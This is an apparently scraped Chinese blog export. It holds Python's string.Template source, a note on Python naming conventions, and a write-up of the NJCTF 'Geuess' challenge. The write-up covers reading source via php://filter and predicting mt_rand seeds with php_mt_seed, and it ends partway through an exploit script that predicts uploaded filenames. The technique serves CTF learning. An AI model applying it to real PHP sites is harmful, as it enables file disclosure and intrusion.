<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span><span class="params">(metaclass=_TemplateMetaclass)</span>:</span></div><div class="line">    <span class="string">"""A string class for supporting $-substitutions."""</span></div><div class="line">    <span class="string">"""能够解析$表达式的字符串模板类"""</span></div><div class="line">    </div><div class="line">    delimiter = <span class="string">'$'</span></div><div class="line">    idpattern = <span class="string">r'[_a-z][_a-z0-9]*'</span></div><div class="line">    flags = _re.IGNORECASE</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, template)</span>:</span></div><div class="line">        self.template = template</div><div class="line"></div><div class="line">    <span class="comment"># Search for $$, $identifier, $&#123;identifier&#125;, and any bare $'s</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_invalid</span><span class="params">(self, mo)</span>:</span></div><div class="line">    </div><div class="line">    <span class="string">"""如果解析到无效的占位符，就告诉调用者在及航机类出错"""</span></div><div class="line">    </div><div class="line">        i = mo.start(<span class="string">'invalid'</span>)</div><div class="line">        lines = self.template[:i].splitlines(keepends=<span class="keyword">True</span>)</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> lines:</div><div class="line">            colno = <span class="number">1</span></div><div class="line">            lineno = <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            colno = i - len(<span class="string">''</span>.join(lines[:<span class="number">-1</span>]))</div><div class="line">            lineno = len(lines)</div><div class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'Invalid placeholder in string: line %d, col %d'</span> %</div><div class="line">                         (lineno, colno))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">substitute</span><span class="params">(*args, **kws)</span>:</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args:</div><div class="line">            <span class="keyword">raise</span> TypeError(<span class="string">"descriptor 'substitute' of 'Template' object "</span></div><div class="line">                            <span class="string">"needs an argument"</span>)</div><div class="line">        self, *args = args  <span class="comment"># allow the "self" keyword be passed</span></div><div class="line">        <span class="keyword">if</span> len(args) &gt; <span class="number">1</span>:</div><div class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Too many positional arguments'</span>)</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args:</div><div class="line">            mapping = kws</div><div class="line">        <span class="keyword">elif</span> kws:</div><div class="line">            mapping = _ChainMap(kws, args[<span class="number">0</span>])</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            mapping = args[<span class="number">0</span>]</div><div class="line">        <span class="comment"># Helper function for .sub()</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(mo)</span>:</span></div><div class="line">            <span class="comment"># Check the most common path first.</span></div><div class="line">            named = mo.group(<span class="string">'named'</span>) <span class="keyword">or</span> mo.group(<span class="string">'braced'</span>)</div><div class="line">            <span class="keyword">if</span> named <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">return</span> str(mapping[named])</div><div class="line">            <span class="keyword">if</span> mo.group(<span class="string">'escaped'</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">return</span> self.delimiter</div><div class="line">            <span class="keyword">if</span> mo.group(<span class="string">'invalid'</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                self._invalid(mo)</div><div class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'Unrecognized named group in pattern'</span>,</div><div class="line">                             self.pattern)</div><div class="line">        <span class="keyword">return</span> self.pattern.sub(convert, self.template)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_substitute</span><span class="params">(*args, **kws)</span>:</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args:</div><div class="line">            <span class="keyword">raise</span> TypeError(<span class="string">"descriptor 'safe_substitute' of 'Template' object "</span></div><div class="line">                            <span class="string">"needs an argument"</span>)</div><div class="line">        self, *args = args  <span class="comment"># allow the "self" keyword be passed</span></div><div class="line">        <span class="keyword">if</span> len(args) &gt; <span class="number">1</span>:</div><div class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Too many positional arguments'</span>)</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args:</div><div class="line">            mapping = kws</div><div class="line">        <span class="keyword">elif</span> kws:</div><div class="line">            mapping = _ChainMap(kws, args[<span class="number">0</span>])</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            mapping = args[<span class="number">0</span>]</div><div class="line">        <span class="comment"># Helper function for .sub()</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(mo)</span>:</span></div><div class="line">            named = mo.group(<span class="string">'named'</span>) <span class="keyword">or</span> mo.group(<span class="string">'braced'</span>)</div><div class="line">            <span class="keyword">if</span> named <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    <span class="keyword">return</span> str(mapping[named])</div><div class="line">                <span class="keyword">except</span> KeyError:</div><div class="line">                    <span class="keyword">return</span> mo.group()</div><div class="line">            <span class="keyword">if</span> mo.group(<span class="string">'escaped'</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">return</span> self.delimiter</div><div class="line">            <span class="keyword">if</span> mo.group(<span class="string">'invalid'</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">                <span class="keyword">return</span> mo.group()</div><div class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'Unrecognized named group in pattern'</span>,</div><div class="line">                             self.pattern)</div><div class="line">        <span class="keyword">return</span> self.pattern.sub(convert, self.template)</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python变量命名规则]]></title>
      <url>http://yoursite.com/2017/03/29/python%E5%8F%98%E9%87%8F%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99/</url>
      <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">最近在读requests模块的源码，好的代码读起来让人心旷神怡。回想之前写的代码变量命名也是胡写一通。决定好好总结一番，并在以后的书写留意。虽然电脑并不会再议变量的名称，但值得在意的是，好的命名，能使你的程序更有可读性。</div></pre></td></tr></table></figure>
<h3 id="0x01-全局变量名（类变量，在java中相当于static变量）"><a href="#0x01-全局变量名（类变量，在java中相当于static变量）" class="headerlink" title="0x01 全局变量名（类变量，在java中相当于static变量）"></a>0x01 全局变量名（类变量，在java中相当于static变量）</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">大写字母，单词之间用_分割</div><div class="line">NUMBER</div><div class="line">COLOR_WRITE</div><div class="line">对于from M import *导入语句，如果想阻止导入模块内的全局变量可以使用旧有的规范，在全局变量上加一个前导的下划线。</div><div class="line"></div><div class="line"><span class="comment">&lt;!-- more --&gt;</span></div><div class="line">*注意*:应避免使用全局变量</div></pre></td></tr></table></figure>
<h3 id="0x02-普通变量"><a href="#0x02-普通变量" class="headerlink" title="0x02 普通变量"></a>0x02 普通变量</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">小写字母，单词之间用_分割</div><div class="line">this_is_a_var</div><div class="line"></div><div class="line">*注意*：</div><div class="line"></div><div class="line"><span class="number">1.</span>不论是类成员变量还是全局变量，均不使用 m 或 g 前缀。</div><div class="line"></div><div class="line"><span class="number">2.</span>私有类成员使用单一下划线前缀标识，多定义公开成员，少定义私有成员。</div><div class="line"></div><div class="line"><span class="number">3.</span>变量名不应带有类型信息，因为Python是动态类型语言。如 iValue、names_list、dict_obj 等都是不好的命名。</div></pre></td></tr></table></figure>
<h3 id="0x03-实例变量"><a href="#0x03-实例变量" class="headerlink" title="0x03 实例变量"></a>0x03 实例变量</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">以_开头，其他和普通变量一样</div><div class="line"><span class="variable">_price</span></div><div class="line"><span class="variable">_instance_var</span></div><div class="line"></div><div class="line">私有实例变量（外部访问会报错）：</div><div class="line">以<span class="variable">__</span>开头（<span class="number">2</span>个下划线），其他和普通变量一样</div><div class="line"><span class="variable">__private_var</span></div></pre></td></tr></table></figure>
<h3 id="0x04-专有变量"><a href="#0x04-专有变量" class="headerlink" title="0x04 专有变量"></a>0x04 专有变量</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">__</span>开头，<span class="variable">__</span>结尾，一般为python的自有变量，不要以这种方式命名</div><div class="line"><span class="variable">__doc__</span></div><div class="line"><span class="variable">__class__</span></div></pre></td></tr></table></figure>
<h3 id="0x05-未完待续"><a href="#0x05-未完待续" class="headerlink" title="0x05 未完待续"></a>0x05 未完待续</h3><p><a href="http://www.voidcn.com/blog/wenxxxxx/article/p-1041297.html" target="_blank" rel="external">参考链接</a></p>
]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NJCTF-Geuess]]></title>
      <url>http://yoursite.com/2017/03/16/NJCTF-Geuess/</url>
      <content type="html"><![CDATA[<h3 id="0x01-获取源码"><a href="#0x01-获取源码" class="headerlink" title="0x01 获取源码"></a>0x01 获取源码</h3><p>利用php的协议php://filter获取源码，具体方法：<code>php://filter/convert.base64-encode/resource=upload</code>，读到源码，然后base64解密</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_error_message</span><span class="params">($message)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></div><div class="line">    &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_message</span><span class="params">($message)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;div class=\"msg success\" id=\"message\"&gt;</span></div><div class="line">    &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span></span></div><div class="line">&#123;</div><div class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</div><div class="line">        <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</div><div class="line">        <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</div><div class="line">        <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</div><div class="line">        <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);<span class="comment">//61</span></div><div class="line">    $str = <span class="string">''</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</div><div class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</div><div class="line">        $str .= $set[$ch];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"$ch"</span>;</div><div class="line">    <span class="keyword">return</span> $str;</div><div class="line">&#125;</div><div class="line">session_start();</div><div class="line">$reg=<span class="string">'/gif|jpg|jpeg|png/'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line"></div><div class="line">    $seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);</div><div class="line">    mt_srand($seed);</div><div class="line">    $ss = mt_rand();</div><div class="line">    $hash = md5(session_id() . $ss);</div><div class="line">    setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</div><div class="line">        show_error_message(<span class="string">"Upload ERROR. Return Code: "</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"error"</span>]);</div><div class="line">    &#125;</div><div class="line">    $check1 = ((($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</div><div class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</div><div class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</div><div class="line">            || ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</div><div class="line">        &amp;&amp; ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>));</div><div class="line">    $check2=!preg_match($reg,pathinfo($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>], PATHINFO_EXTENSION));</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($check2) show_error_message(<span class="string">"Nope!"</span>);</div><div class="line">    <span class="keyword">if</span> ($check1) &#123;</div><div class="line">        $filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span> . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</div><div class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'tmp_name'</span>], $filename)) &#123;</div><div class="line">            show_message(<span class="string">"Upload successfully. File type:"</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>]);</div><div class="line">        &#125; <span class="keyword">else</span> show_error_message(<span class="string">"Something wrong with the upload..."</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        show_error_message(<span class="string">"only allow gif/jpeg/png files smaller than 200kb!"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="0x02-php随机数安全性分析"><a href="#0x02-php随机数安全性分析" class="headerlink" title="0x02 php随机数安全性分析"></a>0x02 php随机数安全性分析</h3><p>从源码中，可以发现两个关键函数rand()函数和mt_rand()函数，在php中，说道rand()函数和mt_rand()函数，就不得不说与他们相对应的两个播种随机数种子的函数，srand（）和mt_srand()，</p>
<p>看如下测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">mt_srand(<span class="number">123456</span>);</div><div class="line">srand(<span class="number">123</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">"rand函数在种子是123456时产生的随机数序列:\n"</span>;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;<span class="number">5</span>;$i++)&#123;</div><div class="line">    <span class="keyword">echo</span> rand().<span class="string">"\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"mt_rand函数在种子是123456时产生的随机数序列:\n"</span>;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;<span class="number">5</span>;$i++)&#123;</div><div class="line">    <span class="keyword">echo</span> mt_rand().<span class="string">"\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170320172308.png" alt=""><br>测试发现无论是rand()函数还是mt_rand()函数，当随机数种子相同时，无论运行多少次，产生的随机数序列都是一样的，故如我们在代码中自己播种了随机的种子，但是泄露了这个种子，就会导致产生的随机数序列被别人猜到，进而造成安全问题。</p>
<p>在php&gt;4.2.0版本中，不再需要手动用stand()或mt_srand()函数给随机数发生器播种了，已自动完成，也就是随机数的种子不用我们给了，php会自动播种一个种子，这样子就不存在种子泄露问题了，这样就完全了吗？其实并不然</p>
<p>PHP7.1 mt_rand已经变好了，本来php的随机数就不应该用在加密解密上，甚至都不应该自己写加密解密的方法。php5里最优的方法应该是用openssl，php7以后php会加自己的加密解密库。</p>
<p>看下面：</p>
<p><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170320175851.png" alt=""><br>在kali系统中，rand() 和 mt_rand() 产生的最大随机数都是2147483647,<br>正好是 2^31-1 , 也就是说随机播种的种子也是在这个范围中,0 – 2147483647 的这个范围是允许我们进行爆破的. 但是用 php爆破比较慢,有大牛已经用c写了一个爆破种子程序php_mt_seed，<a href="http://files.cnblogs.com/files/iamstudy/php_mt_seed-3.2.tar.gz" target="_blank" rel="external">预测种子的工具</a></p>
<p>演示一下它的基本用法<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321195608.png" alt=""><br>在演示例子中，让php自动播种一个种子并产生一个随机数，然后用php_mt_seed这个工具把产生的随机数作为参数，去爆破种子，最后得到三个结果，经验证，三个结果只有前两个是正确的，但是都会产生这样一个随机数</p>
<p>php manual 中说,自动播种种子是指:在每次调用 mt_rand()函数之前都播种一次种子呢,还是多次调用 mt_rand()函数之前,只播种一次种子呢,这对于我们能否猜到产生的随机数序列至关重要.</p>
<p>做一下测试：<br><img src="" alt=""><br>在测试中，在没有进行手工播种的情况下产生两个连续的随机数，然后去爆破种子，得到了四个可能的种子，经过测试发现其中一个种子产生的随机数序列和预期的相同，故可以猜想在php中产生一些列的随机数时，只进行了一次播种</p>
<p>考虑下面代码安全性<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321152106.png" alt=""><br>我们能否根据公开的key，猜到$private？下面演示破解国称，首先获得public key在每一位字符串中的位置：<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321152643.png" alt=""><br>然后用php_mt_seed进行破解<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170321202517.png" alt=""><br>成功破解了一个seed，测试：<br><img src="http://i4.buimg.com/567571/1ad0db77b4747962.png" alt=""><br>这样就说明了,我们只需要拿到public key,就可以预测到private key 的值了.</p>
<h3 id="言归正传"><a href="#言归正传" class="headerlink" title="言归正传"></a>言归正传</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span></span></div><div class="line">&#123;</div><div class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</div><div class="line">        <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</div><div class="line">        <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</div><div class="line">        <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</div><div class="line">        <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</div><div class="line">    $str = <span class="string">''</span>;</div><div class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</div><div class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</div><div class="line">        $str .= $set[$ch];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $str;</div><div class="line">&#125;</div><div class="line">session_start();</div><div class="line"> </div><div class="line">$seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);</div><div class="line">mt_srand($seed);</div><div class="line">$ss = mt_rand();</div><div class="line">$hash = md5(session_id() . $ss);</div><div class="line">setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</div><div class="line"> </div><div class="line">$filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span> . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>我们的目标是猜测出filename.<br>这里 $seed 是 rand(0,999999999)生成的,我们不知道,但是$hash = md5(session_id() . $ss);我们却是知道的,在 cookie的SESSION中,当把cookie中的 PHPSESSID 设为空的时候,session_id()就也是空了,通过结hash,就可以获得 mt_rand() 产生的第一个随机数,然后用 php_mt_seed这工工具爆破种子,就可以直接算出文件名了.</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">mt_srand(<span class="number">831237446</span>);</div><div class="line"><span class="keyword">echo</span> mt_rand().<span class="string">"\n\r"</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span> </span>&#123;</div><div class="line">  $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</div><div class="line">    <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</div><div class="line">    <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</div><div class="line">    <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</div><div class="line">    <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span 